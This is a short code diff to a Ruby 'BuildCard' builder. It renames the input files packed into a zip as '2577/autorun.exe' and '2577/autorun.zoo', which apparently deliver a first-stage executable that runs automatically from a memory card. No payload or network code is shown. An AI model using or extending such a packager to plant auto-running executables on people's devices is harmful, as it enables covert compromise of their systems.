@@ -47,8 +47,8 @@ class BuildCard < Build
     trace :debug, "Build: pack: #{params}"
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open('2577/autorun.exe', "w") { |f| f.write File.open(path('firststage'), 'rb') {|f| f.read} }
-      z.file.open('2577/autorun.zoo', "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
+      z.file.open('2577/autorun.exe', "w") { |f| f.write File.open(path('autorun.exe'), 'rb') {|f| f.read} }
+      z.file.open('2577/autorun.zoo', "w") { |f| f.write File.open(path('autorun.zoo'), 'rb') {|f| f.read} }
     end
 
     # this is the only file we need to output after this point
